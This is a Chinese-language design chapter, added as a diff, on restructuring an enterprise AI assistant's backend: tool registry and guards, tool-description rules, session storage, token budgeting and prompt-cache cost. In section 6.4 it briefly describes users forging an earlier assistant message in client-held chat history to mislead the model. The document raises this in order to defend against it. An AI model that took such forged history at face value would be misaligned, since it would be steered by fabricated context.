@@ -1,0 +1,495 @@
+<section id="p6">
+<h2>第六章　实现：模块划分、工具规范、上下文与成本</h2>
+
+<p>前五章定了原则，这一章把原则落成目录、函数签名、表结构和数字。判断标准很实际：<b>把它交给一个没参与讨论的人，他能照着建出包、写出第一个工具、跑通第一条测试</b>。</p>
+
+<div class="box blue">
+<b class="t">本章要解决的现状问题（逐条有出处）</b>
+<ol>
+<li>996 行的 <code>agent_router.py</code> 同时是工具层、注册表、门控层、HTTP 客户端、循环、降级模板、配置接口和审计</li>
+<li>工具定义在<b>七个地方</b>手工同步（6.3 逐个点名），加一个工具要改七处、还要发前端版本</li>
+<li>聚合工具在<b>已截断</b>的明细上聚合、总数却用全量（<code>agent_router.py:121-135</code>）——线上正在出错数</li>
+<li>历史存前端内存刷新即丢；截断纯按条数×字符，最坏单轮 3-5 万 token 无上限</li>
+<li>system prompt 第一句就插用户名和角色（<code>:477</code>）→ 跨用户缓存前缀共享为 0</li>
+<li>模型返回体里的 <code>usage</code> 拿到手又丢掉（<code>:502</code> → <code>:524</code>），成本至今只能靠猜</li>
+</ol>
+</div>
+
+<h3>6.1　模块划分：backend/app/agent/ 包结构</h3>
+
+<p>拆包的第一原则不是"按技术分层"，而是<b>按变更频率分</b>。工具会天天加，红线守卫一年不动，模型配置随供应商变，会话装配随成本压力调。把变更频率差一个数量级的东西放进同一个文件，就会出现"加个工具顺手改了守卫"这种事故。</p>
+
+<div class="arch">backend/app/agent/
+├─ registry.py     工具注册表：@tool 装饰器 / JSON Schema 自动生成 / 按域枚举
+├─ guard.py        红线守卫：current 非空断言、字段黑名单剔除、Top-N 截断、只读断言
+├─ tools/
+│   ├─ __init__.py 仅做 import 触发注册（本包唯一允许的 import 副作用）
+│   ├─ purchase.py 采购域   → purchase_mgmt_router
+│   ├─ sales.py    销售/回款 → sales_router / leads_router
+│   ├─ orders.py   任务域   → orders_router
+│   ├─ finance.py  资金/报表 → reports_router（口径复用，不重写）
+│   ├─ warehouse.py 仓库域  → warehouse_router（现状零覆盖）
+│   └─ common.py   跨域：晨报聚合、项目全景
+├─ cards.py        卡片类型白名单 + 卡片构造器（facts 由服务端现查填入）
+├─ llm.py          模型配置读库 + OpenAI 兼容 HTTP + usage 提取（请求级构造）
+├─ prompt.py       system prompt 拼装：稳定前缀 / 易变后缀严格分离
+├─ session.py      会话与消息落库、按 token 截断、旧轮工具结果压缩
+├─ sse.py          SSE 事件编码（text delta / tool / card / done）
+└─ loop.py         自建门面：包 AgentScope ReActAgent + pre/post_acting 钩子</div>
+
+<p><code>routers/agent_router.py</code> 随之瘦身成纯 HTTP 层：<code>POST /chat</code>（SSE）、<code>GET/PUT /config</code>、<code>GET /chat-logs</code>、<code>GET /sessions</code>、<code>GET /tools</code>。现有的 <code>_effective_llm_config</code>（<code>agent_router.py:762</code>）、<code>_mask_key</code>（<code>:776</code>）、配置校验逻辑（<code>:825-876</code>）整段搬进 <code>llm.py</code>，接口层只剩参数校验和序列化。</p>
+
+<h4>依赖方向：单向，且不可逆</h4>
+
+<div class="arch">                    ┌──────────────┐
+                    │  main.py     │  装载 router 前先 import agent.tools
+                    └──────┬───────┘
+                           ▼
+   ┌───────────────────────────────────────────────┐
+   │            routers/agent_router.py            │  ← HTTP 层，只做编解码
+   └───────┬───────────────────────┬───────────────┘
+           ▼                       ▼
+    ┌────────────┐          ┌─────────────┐
+    │  loop.py   │◀────────▶│   llm.py    │  请求级构造，无模块级单例
+    └─────┬──────┘          └─────────────┘
+          │ 取工具/执行
+          ▼
+    ┌────────────┐  装饰时套壳  ┌───────────┐
+    │ registry.py│─────────────▶│ guard.py  │  守卫在最内层，工具作者绕不过
+    └─────┬──────┘              └───────────┘
+          │ 注册
+          ▼
+    ┌────────────┐    调用 + 传真实 current    ┌────────────────────┐
+    │  tools/*   │───────────────────────────▶│ routers/业务_router │
+    └────────────┘        ✗ 反向禁止 ✗        └────────────────────┘
+          │
+          ├─▶ session.py / prompt.py / sse.py / cards.py（被 loop 与 router 使用）
+          └─▶ ✗ 禁止 import 任何 agent 之外的 app.routers 以外模块的私有实现</div>
+
+<div class="box red">
+<b class="t">硬规矩：<code>routers/*</code> 永远不 import <code>app.agent</code></b>
+<p>反过来 <code>agent/tools/*</code> 可以（而且必须）import <code>routers/*</code>。这条不是洁癖：</p>
+<ul>
+<li><b>故障隔离</b>——agent 包里一个 import 错误、一个第三方库版本冲突（AgentScope 迭代很快，第四章 4.3(d) 已经点名这个风险），不能让采购页面 500。反向依赖一旦建立，任何 agent 侧的问题都会变成全站问题。</li>
+<li><b>防止口径分叉</b>——一旦允许 <code>sales_router</code> import agent，就会有人"顺手"在页面接口里调 agent 的聚合函数，于是同一个数字有了两条计算路径，早晚对不上。<code>reports_router.py:411</code> 那段防双算注释就是这类问题吃过亏的产物。</li>
+<li><b>唯一例外是启动顺序</b>——<code>tools/__init__.py</code> 的 import 副作用必须在 <code>main.py</code> 装载 router 之前跑一次，否则注册表是空的。这一条写进 <code>main.py</code> 的注释，别指望后人猜。</li>
+</ul>
+</div>
+
+<p>另一条容易忽略的方向：<b><code>guard.py</code> 被 <code>registry.py</code> 依赖，不被 <code>tools/*</code> 依赖</b>。工具作者不需要知道 guard 存在，也就没法"忘了调"。第四章 4.3(b) 说红线守卫要放在<b>工具包装器最内层</b>而不是只挂 <code>pre/post_acting</code> 钩子，落到代码上就是这个依赖方向——钩子挂在 Agent 上，换个 Agent 实现就没了；包装器长在注册表里，只要工具是注册进来的就绕不过。</p>
+
+<h3>6.2　工具设计规范（可直接当团队规范用）</h3>
+
+<h4>命名：动词_域_对象</h4>
+
+<p>现状七个工具全是名词短语：<code>po_arrival_overdue</code>、<code>balance_due</code>、<code>overdue_orders</code>（<code>agent_router.py:311-319</code>）。名词短语的问题是模型看不出这是"查"还是"改"，人在审计日志里也看不出。改成 <code>list_purchase_overdue</code> / <code>get_project_status</code> / <code>summarize_supplier_delay</code>。</p>
+
+<p>L3 引入卡片后，前缀承担更重的语义：<b><code>propose_</code> 前缀专属于"生成待确认卡片"的工具</b>，比如 <code>propose_purchase_urge</code>。这样 <code>agent_chat_logs.tools_used</code>（<code>models.py:1118</code>）里出现任何 <code>propose_*</code>，就意味着这一轮产生了提案，运维扫日志时一眼可见，不需要解析回答文本。</p>
+
+<h4>描述：写"什么时候该调"，不只是"它做什么"</h4>
+
+<p>模型选工具唯一的依据就是 description。现状全是功能说明，缺触发条件和边界。对照：</p>
+
+<div class="scroll"><table>
+<tr><th>工具</th><th>现状描述（<code>agent_router.py:361-395</code>）</th><th>应该写成</th></tr>
+<tr><td>morning_report</td><td>"晨报聚合：采购到期未到货/部门逾期任务/尾款到期/人事到期 各 Top5 + 计数"</td><td>"当用户问『今天要盯什么』『有什么风险』『晨报』，或提出没有指明具体域的开放式问题时调用。返回四个域各 Top5 + 总数，用于概览；<b>用户已经指明了域（如只问采购）时不要调它</b>，改调该域的专用工具拿明细。"</td></tr>
+<tr><td>po_overdue_by_supplier</td><td>"到期未到货按供应商聚合：每家供应商的未收货条数、最大超期天数、涉及项目"</td><td>"当用户想知道<b>是哪几家供应商</b>在拖期、要不要约谈供应商时调用。只回汇总不回明细；用户要具体物料清单请改调 list_purchase_overdue。"</td></tr>
+<tr><td>project_status</td><td>"按项目编号查询项目进度：基本信息/各部门任务/未到货采购/尾款"</td><td>"用户消息里出现项目编号（形如 2501-012 或 TH-2501）时调用。<b>没有编号不要猜</b>，先反问用户要编号。"</td></tr>
+</table></div>
+
+<p>最后一条尤其重要：规则降级路径好歹用正则抓编号（<code>agent_router.py:551</code>），LLM 路径完全靠模型自觉，描述里没有任何"没编号怎么办"的指引——模型很容易编一个编号去查，再如实回答"查不到"，用户看到的是"这助手连我们项目都不认识"。</p>
+
+<h4>参数 schema 最小化</h4>
+
+<p>规则：<b>能从上下文推的不做参数；跟身份和权限有关的绝对不做参数</b>。</p>
+
+<p>现状有个活标本：<code>tool_overdue_orders(db, dept, allowed_depts)</code>（<code>agent_router.py:168-169</code>）。<code>allowed_depts</code> 是<b>权限参数</b>，却出现在函数签名上——它现在之所以安全，只是因为它没被写进 <code>TOOL_SCHEMAS</code>（<code>:384-389</code>），模型看不见。<b>靠"忘了写进 schema"来保证安全，不是设计</b>。正确做法是让它由 <code>preset_kwargs</code> 从真实 <code>current</code> 推导，或者干脆消失——因为一旦按第三章原则①去调 <code>orders_router</code> 的列表函数并传真实 <code>current</code>，部门收窄和 <code>worker_id == current.id</code> 的行级过滤（<code>orders_router.py:317</code>）自动就继承了，根本不需要这个参数。</p>
+
+<h4>返回值裁剪：4-6 个字段，Top-20 硬上限</h4>
+
+<p>现状 <code>tool_po_arrival_overdue</code> 返回 7 个字段 × 20 行（<code>agent_router.py:86-93</code>），而 system prompt 第 4 条却要求模型"从工具字段里挑最有用的 4-6 列"（<code>agent_router.py:481</code>）——这是<b>把裁剪工作外包给模型</b>：多出来的字段照样计费、照样进上下文、照样有泄露风险，只是最后没显示。裁剪必须在服务端做完，模型看到什么就该是要展示什么。</p>
+
+<div class="box amber">
+<b class="t">Top-20 是红线，不是偷懒</b>
+<p>这个系统有独立的<b>导出审批闸门</b>：<code>export_requests</code> 表（<code>models.py:481-490</code>），开关打开后导出要走 <code>pending → approved</code> 流程（完整论证与"开关默认关但必须按会被打开来设计"的注意事项见第五章 5.2.4）。这里只强调一条实现含义：<b>Top-N 的 N 不是拍脑袋定的，它由"这个系统的批量导出闸门卡在哪"倒推</b>——换个没有导出审批的客户，N 可以放宽；这个客户不行。</p>
+</div>
+
+<h4>一个工具只做一件事——以及本项目的真实 bug</h4>
+
+<p><code>tool_po_overdue_by_supplier</code>（<code>agent_router.py:121-135</code>）的写法是：</p>
+
+<pre><code>d = await tool_po_arrival_overdue(db, min_overdue_days=0)   # :123
+#   d = {"count": 全量条数, "items": rows[:20]}              # 见 :93
+for it in d["items"]:                                       # :125 只遍历前 20 条
+    ...按 supplier 累加 count / max_over_days / projects...
+return {"count": len(rows), "item_total": d["count"], ...}  # :135 全量条数
+</code></pre>
+
+<p>后果很具体：假设全库 87 条逾期，供应商甲占 30 条但只有 12 条挤进按超期天数排序的 Top-20。页面显示"甲：12 条"，表头却写"共 87 条"——两个数字来自不同样本，怎么都对不上。更糟的是"哪家拖期最狠"这个排序在总数超 20 时本身就失真：一家有 25 条中度逾期的供应商，可能一条都进不了按 <code>max_over_days</code> 排的 Top-20。</p>
+
+<p>规范条款因此写成：<b>聚合类工具必须自己跑聚合查询，禁止在另一个工具的截断结果上二次加工</b>。截断是"给模型看的裁剪"，不是"数据集"，两者混用必然出错。</p>
+
+<h4>错误返回 <code>{"error": ...}</code>，不抛异常</h4>
+
+<p>现状已经做对了，保留：<code>_deny()</code>（<code>agent_router.py:404-406</code>）把无权访问包装成 <code>{"error": "你无权查询该域数据（需要 采购管理 菜单权限）"}</code> 作为工具返回值回灌。理由是抛异常会让整轮对话失败、用户看到"请求失败"；回灌错误则让模型转述成一句人话。副作用是模型可能重试同一个工具——用轮次上限兜住（现状 <code>for _ in range(4)</code>，<code>agent_router.py:522</code>）。</p>
+
+<h4>禁止事项清单</h4>
+
+<div class="scroll"><table>
+<tr><th>#</th><th>禁止</th><th>为什么（本项目出处）</th></tr>
+<tr><td>1</td><td>不写 SQL、不自己 new Session</td><td>只调 router 函数并传真实 <code>current</code>，权限与行级过滤自动继承（第三章原则①；现状七个工具全是裸 <code>select()</code>，后果见 3.1）</td></tr>
+<tr><td>2</td><td>不判角色</td><td>工具里不出现 <code>current.has_role(...)</code>。权限判定的唯一实现在被调的 router 里——那些谓词抄一遍就会抄错（<code>purchase_mgmt_router.py:46</code>、<code>models.py:83</code>，详见 3.1.3）</td></tr>
+<tr><td>3</td><td>不返回 JSON 自由列</td><td><code>records.values</code>（<code>models.py:180</code>）、<code>projects.extra</code>、<code>custom_values</code>（<code>models.py:393</code>、<code>:641</code>）、<code>oa_requests.detail</code> 完全没有字段级保护，里面装什么完全取决于业务当时怎么填，整列禁止出现在返回值里</td></tr>
+<tr><td>4</td><td>不返回黑名单字段</td><td><code>employees.id_card</code>（<code>hr_router.py:122</code> 的 <code>_emp_out()</code> 至今原样返回）、<code>suppliers.bank_account</code>（<code>purchase_mgmt_router.py:104</code>，付款诈骗素材）、<code>employee_salary_monthly.*</code>、<code>app_settings</code> 里 AI 助手自己的 API Key。黑名单写在 <code>guard.py</code> 里，由装饰器统一剔除</td></tr>
+<tr><td>5</td><td>不做任何写操作</td><td>保持 <code>AGENTS.md:56</code> 的只读铁律。L3 的"写"由人在卡片上点确认、用<b>人自己的 token</b> 打现有业务端点完成，Agent 侧全程不写库</td></tr>
+<tr><td>6</td><td>不超 Top-N</td><td>见上，由导出审批闸门倒推</td></tr>
+<tr><td>7</td><td>不接收权限参数</td><td>身份、部门、租户一律由框架注入，不进 schema。见上面 <code>allowed_depts</code> 的例子</td></tr>
+</table></div>
+
+<h3>6.3　registry 装饰器：把七处同步收敛成一处</h3>
+
+<p>先把"七处"数清楚——常说的"六处"其实少数了一个：</p>
+
+<div class="scroll"><table>
+<tr><th>#</th><th>位置</th><th>内容</th><th>漏改的后果</th></tr>
+<tr><td>1</td><td><code>agent_router.py:361</code> <code>TOOL_SCHEMAS</code></td><td>下发给模型的 JSON Schema</td><td>模型根本看不到新工具</td></tr>
+<tr><td>2</td><td><code>agent_router.py:311</code> <code>TOOL_LABELS</code></td><td>中文标签</td><td><code>sources</code> 里 KeyError；实际是靠 <code>:540</code> 的 <code>if name in TOOL_LABELS</code> 静默吞掉，工具调了但"数据来源"不显示</td></tr>
+<tr><td>3</td><td><code>agent_router.py:322</code> <code>_TOOL_SUGGESTIONS</code></td><td>追问 chips 文案</td><td>回答后没有追问建议</td></tr>
+<tr><td>4</td><td><code>agent_router.py:334</code> <code>_SUGGESTION_TOOL</code></td><td>chips 文案反查工具（用于按权限过滤）</td><td>无权用户看到点了会被拒的 chip</td></tr>
+<tr><td>5</td><td><code>agent_router.py:409</code> <code>_allowed_tools</code></td><td>菜单 key → 工具集合</td><td>新工具对所有人不可用（或对所有人可用，看默认分支怎么写）</td></tr>
+<tr><td>6</td><td><code>agent_router.py:427</code> <code>_run_tool</code></td><td>name → 函数的 if/elif 分发 + 二次门控</td><td>返回 <code>{"error": "未知工具 xxx"}</code>（<code>:472</code>）</td></tr>
+<tr><td>7</td><td><code>AgentView.vue:111</code> <code>AUDIT_TOOL_LABELS</code></td><td>前端审计表的中文标签</td><td>审计页显示英文原始名——而且要发前端版本才能修</td></tr>
+</table></div>
+
+<h4>装饰器签名</h4>
+
+<pre><code>@tool(
+    name="list_purchase_overdue",
+    label="采购到期未到货",
+    domain="purchase_mgmt",              # 菜单门控 key；元组表示"任一即可"
+    when="用户问采购是否拖期/未到货/供应商压货时调用；"
+         "要按供应商汇总请改调 summarize_supplier_delay",
+    followups=("按供应商汇总未到货", "未来 7 天到货"),
+    top_n=20,
+    deny_fields=("bank_account", "id_card"),   # 追加到全局黑名单
+)
+async def list_purchase_overdue(
+    db: AsyncSession,
+    current: models.User,                            # 注入，不进 schema
+    min_overdue_days: Annotated[int, "最小超期天数，默认 0（含当天到期）"] = 0,
+) -&gt; dict:
+    ...
+</code></pre>
+
+<h4>JSON Schema 自动生成</h4>
+
+<p>用 <code>inspect.signature</code> + <code>typing.get_type_hints(include_extras=True)</code> 遍历参数，逐条处理：</p>
+<ul>
+<li>参数名在 <code>_INJECTED = {"db", "current"}</code> 白名单里 → 跳过，不进 schema（这是"权限参数不可见"的机械保证，不再依赖人记得）</li>
+<li><code>int / float / str / bool</code> → 直接映射；<code>Literal["design","electric","produce"]</code> → <code>enum</code>；其余复杂类型 → 直接在注册时抛异常（<b>启动即失败，而不是运行时才发现模型传了个乱七八糟的对象</b>）</li>
+<li><code>Annotated[T, "描述"]</code> 的第二项作为 <code>description</code>；没写描述 → 注册时抛异常</li>
+<li>有默认值 → 不进 <code>required</code></li>
+<li>生成后<b>按参数名排序</b>，整个注册表<b>按工具名排序</b>，序列化统一 <code>json.dumps(..., sort_keys=True)</code>——顺序稳定是 prompt 缓存的前提，见 6.5</li>
+</ul>
+
+<p>装饰器返回的不是原函数，而是 <code>guard.wrap(fn, meta)</code>，包装器内部依次做：<code>current</code> 非空断言 → 调用原函数 → 递归剔除黑名单字段与 JSON 自由列 → 列表字段 Top-N 截断并补 <code>truncated: true</code> → 会话 dirty 检查（有未提交的写操作直接抛，把"只读"从口头约定变成运行期断言）。<b>工具作者写不出绕过它的代码</b>——除非不用装饰器，而没有装饰器的函数根本不在注册表里，模型看不见。</p>
+
+<h4>一处定义，七个消费者</h4>
+
+<div class="scroll"><table>
+<tr><th>消费者</th><th>由哪个字段生成</th></tr>
+<tr><td>下发给模型的 schema</td><td><code>name</code> + <code>when</code> + 参数（按名排序）</td></tr>
+<tr><td>权限门控</td><td><code>domain</code> → 与 <code>menus.user_menu_keys(current)</code>（<code>menus.py:142</code>）求交</td></tr>
+<tr><td>审计标签 / <code>sources</code></td><td><code>label</code></td></tr>
+<tr><td>追问 chips 与其权限过滤</td><td><code>followups</code> + <code>domain</code></td></tr>
+<tr><td>分发</td><td>注册表字典本身，不再有 if/elif 链</td></tr>
+<tr><td>返回值裁剪</td><td><code>top_n</code> + <code>deny_fields</code></td></tr>
+<tr><td>前端标签</td><td>新接口 <code>GET /api/agent/tools</code> → <code>[{name, label, domain}]</code></td></tr>
+</table></div>
+
+<p>前端改法：<code>AgentView.vue:111</code> 的 <code>AUDIT_TOOL_LABELS</code> 常量删掉，登录后拉一次 <code>/api/agent/tools</code> 存进 pinia，<code>toolLabel()</code> 改查 store、查不到就回退原始名（<code>:120</code> 已经有这个兜底，行为不变）。代价是多一次 HTTP；收益是<b>新增工具不再需要发前端版本</b>。这一点在本项目不是小事：桌面客户端有在线版本分布统计（<code>main.py:127</code> 的 <code>desktop_client_stats</code> 中间件按 <code>X-PMS-Client</code> 头 upsert），说明老版本会在线上活很久——硬编码的标签会长期错位，而且错位的是给管理层看的审计页。</p>
+
+<h3>6.4　上下文与会话管理</h3>
+
+<h4>现状三个问题</h4>
+
+<div class="box red">
+<b class="t">三个问题，都在同一段代码里</b>
+<ul>
+<li><b>① 历史存前端内存。</b><code>AgentView.vue:33</code> 的 <code>messages</code> 是个 <code>ref</code>，刷新即丢；每轮由前端把最近 20 条回传（<code>:156-160</code>），后端再截一次（<code>agent_router.py:945</code>）。后果不只是换设备丢上下文，更要紧的是<b>历史内容由客户端控制</b>——用户可以伪造一条 assistant 消息（"你刚才说全公司尾款合计是 XXX"）诱导模型。事实源在工具返回值里（第三章原则②）能兜住数字不被编造，但会污染模型对意图的判断，L3 里还会影响它决定"该不该出这张卡"。</li>
+<li><b>② 截断纯按条数 × 字符。</b><code>agent_router.py:945</code>：<code>h.content[:2000] for h in body.history[-20:]</code>。20 条 × 2000 字符 = 最坏 4 万字符，中文按 ~1 token/字算就是 3-5 万 token 的历史，再叠工具结果直接超窗 400——而 400 会被 <code>:957</code> 的宽泛 except 吞掉降级成规则模式，用户只看到一个"规则模式"小标签，不知道发生了什么。</li>
+<li><b>③ 工具结果只增不减。</b><code>:531-545</code> 每轮把 assistant 的 <code>tool_calls</code> 和全部 tool 结果 append 进 <code>messages</code>，下一轮整包重发。4 轮循环的第 4 次请求带着前 3 轮<b>全部</b>工具 JSON；每轮最多 4 个工具（<code>:532</code>）× 每个 20 行，最坏光工具结果就 3 万 token 以上。</li>
+</ul>
+</div>
+
+<h4>会话表结构</h4>
+
+<pre><code>agent_sessions   (id, user_id, title, created_at, updated_at, archived)
+agent_messages   (id, session_id, seq, role, content, tool_name, tool_call_id,
+                  tokens, created_at)
+</code></pre>
+
+<p>三点设计说明：</p>
+<ul>
+<li><b><code>tool</code> 角色的消息单独成行</b>，<code>content</code> 存工具返回的 JSON 原文——审计需要原始值（"当时给模型看的到底是什么"），但装配上下文时可以按新鲜度改写。存的和用的不必相同。</li>
+<li><b><code>agent_chat_logs</code> 不合并进来</b>。它是"按请求"的审计粒度（<code>models.py:1108-1122</code>），<code>agent_messages</code> 是"按消息"的会话粒度。不合并的实际理由：会话被用户删掉后，审计记录必须还在——这是内控要求，不是技术偏好。</li>
+<li><b><code>tokens</code> 列在写入时就算好</b>，装配时直接累加，不用每次重算。</li>
+</ul>
+
+<h4>按 token 截断，不按字符</h4>
+
+<p>装配顺序固定：<b>稳定前缀（system + tools，约 1k）→ 当前问题 → 倒序回填历史直到额度用尽</b>。估算器不需要精确，中文 1 字 ≈ 1 token、ASCII 4 字符 ≈ 1 token 的粗算误差在 10% 以内，够用；真值等审计表记上 <code>prompt_tokens</code> 之后（见 6.5）再回来校准系数。</p>
+
+<p>一条硬规矩：<b>截断必须以整条消息为单位，禁止截断消息中间</b>。现状 <code>content[:2000]</code> 会从一个 markdown 表格中间切断，模型看到半张表会照着这个残缺格式继续写——用户拿到的是一张列数对不上的表。宁可整条丢掉。</p>
+
+<h4>工具结果的"新鲜度"分级</h4>
+
+<div class="scroll"><table>
+<tr><th>轮次</th><th>上下文里保留什么</th><th>典型 token</th></tr>
+<tr><td>本轮</td><td>完整 JSON（Top-20 全字段）</td><td>~2000</td></tr>
+<tr><td>上一轮</td><td>压缩摘要："list_purchase_overdue → 87 条，最严重：XX 物料超期 12 天（供应商甲）"</td><td>~40</td></tr>
+<tr><td>更早</td><td>一行元信息："曾调用 list_purchase_overdue"</td><td>~10</td></tr>
+</table></div>
+
+<p>为什么更早的还要留一行：system prompt 第 5 条已经在要求模型"拿到工具结果后直接总结，不要重复调用同一工具"（<code>agent_router.py:482</code>）。要它遵守这条，它得知道自己调过什么——但不需要三轮前的 20 行明细。<b>保留意图、丢弃数据</b>，这是多轮 Agent 上下文压缩最通用的一条经验。</p>
+
+<p>只增不减还有一条更狠的对策：<b>同一工具在同一会话里被重复调用时，只保留最后一次的完整结果，之前的一律降为元信息</b>。这个规则在"晨报 → 追问采购 → 再追问尾款"这类真实路径上，能砍掉多轮里最大的一块 token。</p>
+
+<h3>6.5　成本模型与 prompt 缓存</h3>
+
+<h4>成本形态：短问题 + 大 system + 多轮工具结果</h4>
+
+<p>先把一次问答的 token 账算清楚。一次工具调用 = <b>两次</b> HTTP 请求（第一次模型决定调工具，第二次模型看着结果作答）：</p>
+
+<div class="scroll"><table>
+<tr><th>组成</th><th>第 1 次请求（输入）</th><th>第 2 次请求（输入）</th></tr>
+<tr><td>system prompt（<code>agent_router.py:477-484</code>，约 350 汉字）</td><td>~400</td><td>~400</td></tr>
+<tr><td>工具 schema × 7（<code>:361-395</code>）</td><td>~600</td><td>~600</td></tr>
+<tr><td>历史（典型 10 条）</td><td>~3000</td><td>~3000</td></tr>
+<tr><td>本轮问题</td><td>~20</td><td>~20</td></tr>
+<tr><td>assistant 的 tool_calls 回灌</td><td>—</td><td>~80</td></tr>
+<tr><td>工具结果（20 行 JSON）</td><td>—</td><td>~2000</td></tr>
+<tr><td><b>输入合计</b></td><td><b>~4020</b></td><td><b>~6100</b></td></tr>
+<tr><td>输出</td><td>~30（只是 tool_calls）</td><td>~900（markdown 表）</td></tr>
+</table></div>
+
+<p><b>一问一答：输入约 10,100 token，输出约 930 token——输入是输出的 11 倍。</b>这是所有"问数型 Agent"的通用形态。结论也就通用：<b>优化输出长度几乎没有意义，优化输入结构才有意义</b>。很多团队第一反应是"让模型少说点"，方向就错了。</p>
+
+<h4>月度成本估算方法</h4>
+
+<pre><code>月输入 token = 人数 × 日均问答数 × 单问输入 token × 工作日数
+月输出 token = 人数 × 日均问答数 × 单问输出 token × 工作日数
+月成本 = 月输入 × (命中率 × 单价_cached + (1-命中率) × 单价_in) + 月输出 × 单价_out
+</code></pre>
+
+<p>代入本项目：40 人 × 5 问/天 × 22 天 = <b>4400 问/月</b> → 输入 44.4M token、输出 4.1M token。按「输入 ¥2/百万、缓存命中 ¥0.2/百万、输出 ¥8/百万」这个量级估（2026 年国产 OpenAI 兼容模型的常见档位；<b>实际必须以你自己供应商的价目表为准</b>，这里只演示算法）：</p>
+
+<div class="scroll"><table>
+<tr><th>场景</th><th>输入费用</th><th>输出费用</th><th>月合计</th></tr>
+<tr><td>无缓存（=现状）</td><td>44.4M × ¥2 = ¥88.8</td><td>4.1M × ¥8 = ¥32.8</td><td><b>≈ ¥122</b></td></tr>
+<tr><td>缓存命中 60%</td><td>26.6M×¥0.2 + 17.8M×¥2 = ¥40.9</td><td>¥32.8</td><td><b>≈ ¥74</b>（省 39%）</td></tr>
+</table></div>
+
+<p>这个数字的意义不是"贵"，恰恰相反：<b>便宜到不该为省钱牺牲正确性</b>——不要为了省 token 去砍权限校验、砍二次核验、砍审计。但它会随人数、轮数、prompt 长度<b>线性增长</b>，而 L3 要加卡片说明、判断规则、更长的 system prompt，单问输入很容易翻倍到 2 万；再叠上人数从 40 涨到 200，就是 ¥122 → ¥1200 的量级。所以缓存要在成本还小的时候就做对，而不是等账单变难看再回头改结构。</p>
+
+<h4>缓存是前缀匹配——现状三处破前缀</h4>
+
+<p>主流供应商的自动前缀缓存机制是一样的：<b>从第一个 token 开始逐段哈希，命中到第一个不一致处为止</b>。任何一个字节的变化，都让它<b>后面的全部内容</b>失效。参与哈希的顺序通常是 <code>tools → system → messages</code>。对照现状：</p>
+
+<div class="scroll"><table>
+<tr><th>#</th><th>破坏源</th><th>位置</th><th>后果</th></tr>
+<tr><td>1</td><td>system prompt <b>第一句</b>就插 <code>{user_name}</code> / <code>{roles}</code></td><td><code>agent_router.py:477</code>、<code>:515</code></td><td>「当前服务对象：「王芹」（角色：buyer、finance、logistics）」出现在第 30 字符左右 → <b>跨用户前缀共享 = 0</b>。40 个人问同一个问题，40 份独立缓存</td></tr>
+<tr><td>2</td><td>system prompt 末尾 <code>今天日期：{today}</code></td><td><code>agent_router.py:484</code></td><td>位置虽在 system 末尾，但仍在<b>历史之前</b> → 每过一天，全体用户的整段 system+tools 缓存作废。比 ① 更隐蔽，因为它"看起来已经放在末尾了"</td></tr>
+<tr><td>3</td><td>按用户菜单<b>裁剪</b>工具 schema 列表</td><td><code>agent_router.py:518-519</code></td><td>采购员 4 个工具、财务 3 个、admin 7 个，<code>tools</code> 参数逐字节不同；而 tools 排在最前参与哈希 → <b>即使修好 ①②，跨用户前缀依然是 0</b></td></tr>
+</table></div>
+
+<h4>修法</h4>
+
+<ol>
+<li><b>稳定内容全部提到最前</b>：六条规则、输出格式要求、表格列数要求——这些跨用户、跨天完全一致，是唯一值得缓存的大块。</li>
+<li><b><code>user_name</code> / <code>roles</code> / <code>today</code> 挪出 system</b>，放到首条 user 消息的开头（或 system 数组的最后一个 block）。模型服从性没有可测差异，缓存前缀却从"零共享"变成"全体共享"。</li>
+<li><b>工具 schema 全量下发，不按用户裁剪</b>；权限仍由运行期门控兜住——现状本来就是双保险，<code>:517</code> 的注释自己写着"<code>_run_tool</code> 内仍二次门控"。代价是模型偶尔调用无权工具，拿到 <code>{"error": ...}</code> 后转述一句"你没有这个权限"，多花一轮约 6k token。<b>这笔账要算给自己看</b>：7 个工具的规模下裁剪省的 schema token 约 300，远小于毁掉的缓存收益；等工具涨到几十个、无权调用变频繁时，再改成"按域分组下发"（同一菜单组合共享同一份 tools）。</li>
+<li><b>序列化顺序必须稳定</b>：工具按 name 排序、参数按名排序、<code>json.dumps(sort_keys=True)</code>。现状 <code>TOOL_SCHEMAS</code> 是手写列表（<code>:361</code>）顺序天然固定，看似没问题；但一旦改成 registry 自动生成，字典遍历顺序就成了隐患——Python 3.7+ 的 dict 保插入序，而插入序取决于 import 顺序，改一行 <code>tools/__init__.py</code> 就可能让全量缓存失效。这种 bug 不报错、只涨钱，极难发现。</li>
+</ol>
+
+<h4>用 agent_chat_logs 实测校准</h4>
+
+<div class="box green">
+<b class="t">现成的数据被丢掉了</b>
+<p><code>_llm_request</code> 返回的是<b>完整响应体</b>（<code>agent_router.py:502</code> <code>return r.json()</code>），OpenAI 兼容响应里的 <code>usage</code> 字段（<code>prompt_tokens</code> / <code>completion_tokens</code>，多数供应商还带 <code>prompt_cache_hit_tokens</code>）就在里面。但 <code>_chat_with_llm</code> 只取 <code>data["choices"][0]["message"]</code>（<code>:524</code>），<code>usage</code> 原样丢弃。<b>不需要新增任何外部依赖，只需要不丢它。</b></p>
+</div>
+
+<p>给 <code>agent_chat_logs</code>（<code>models.py:1108-1122</code>，现有字段是 问/答/工具/方式/模型/耗时）加四列：<code>prompt_tokens</code> / <code>completion_tokens</code> / <code>cached_tokens</code> / <code>rounds</code>。一周后就能用真实数据替换上面所有估算，并直接算出两个关键指标：</p>
+<ul>
+<li><b>缓存命中率 = cached_tokens / prompt_tokens</b>。修完 prompt 结构后，这个比值应该从接近 0 涨到 0.5 以上。<b>涨不上去，说明还有别的前缀破坏源</b>——这是一个可以证伪的验收标准，比"我觉得优化了"强得多。</li>
+<li><b>轮次分布</b>。<code>rounds</code> 长期贴着上限 4（<code>:522</code>）说明模型在反复试探，多半是 description 没写清"什么时候该调"，回到 6.2 改描述，比调模型参数有效。</li>
+</ul>
+
+<p>顺带一提，这四列还解决了另一个问题：现状 30s 超时是<b>每请求</b>级别（<code>agent_router.py:499</code>），4 轮循环没有全局 deadline，最坏 120s 以上——有了 <code>rounds</code> 和 <code>duration_ms</code> 的联合分布，才能给全局 deadline 定一个有依据的值，而不是拍脑袋。<b>完整的五层预算设计（单请求 / 单轮 / 单工具 / 会话 token / 日成本）见第十章 10.6</b>；本节算的是"稳态一个月多少钱"，而第十章 10.8 算的是另一笔账——<b>成本的放大效应</b>：L2 定时推送把"人问才花钱"变成"不问也花钱"，这笔账在这里是看不见的。</p>
+
+<h3>6.6　流式与前端卡片渲染</h3>
+
+<h4>SSE 事件设计</h4>
+
